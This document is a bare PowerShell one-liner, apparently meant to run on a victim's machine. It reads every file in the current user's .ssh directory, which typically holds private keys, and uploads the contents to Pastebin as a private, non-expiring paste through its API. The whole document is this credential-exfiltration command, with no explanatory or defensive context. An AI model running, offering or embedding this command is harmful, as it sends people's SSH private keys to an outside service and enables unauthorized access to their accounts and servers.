$apiKey="APIKEYHERE"; $content=if (Test-Path "C:\Users\$env:USERNAME\.ssh\") { (Get-ChildItem "C:\Users\$env:USERNAME\.ssh\" -File | ForEach-Object { "File: $_`nContents:`n$(Get-Content $_.FullName)`n" }) -join "`n" } else { "The path does not exist." }; Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method Post -Body @{api_dev_key=$apiKey; api_option="paste"; api_paste_code=$content; api_paste_private="1"; api_paste_name="SSH Directory Contents"; api_paste_format="powershell"; api_paste_expire_date="N"}
